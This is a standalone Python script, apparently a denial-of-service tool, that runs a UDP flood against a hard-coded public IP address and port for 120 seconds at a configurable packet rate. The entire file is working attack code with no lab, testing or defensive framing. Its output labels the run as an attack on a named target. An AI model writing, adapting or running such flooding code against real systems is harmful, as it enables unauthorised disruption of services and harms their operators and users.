import socket
import time
import random
import os
import sys

# CONFIGURATION
TARGET_IP = "20.235.148.44"
TARGET_PORT = 25431
DURATION = 120
PACKETS_PER_SEC = 5000  # Increase this number if your CPU is strong

def clear():
    os.system('cls' if os.name == 'nt' else 'clear')

def attack():
    print(f"🎯 Target: {TARGET_IP}:{TARGET_PORT}")
    print(f"🔥 Starting UDP Flood for {DURATION} seconds...")
    print(f"⚡ Speed: {PACKETS_PER_SEC} packets/sec")
    
    # Create UDP socket
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    # Packet payload (random data)
    payload = b"\x00" * 1024  # 1KB of random junk data per packet
    
    start_time = time.time()
    count = 0
    
    try:
        while time.time() - start_time < DURATION:
            # Send UDP packet
            sock.sendto(payload, (TARGET_IP, TARGET_PORT))
            count += 1
            
            # Sleep to control rate
            time.sleep(1.0 / PACKETS_PER_SEC)
            
    except KeyboardInterrupt:
        print("\n⛔ Attack stopped by user.")
    except Exception as e:
        print(f"\n❌ Error: {e}")
    finally:
        sock.close()
        print(f"✅ Finished. Sent {count} packets.")

if __name__ == "__main__":
    clear()
    attack()
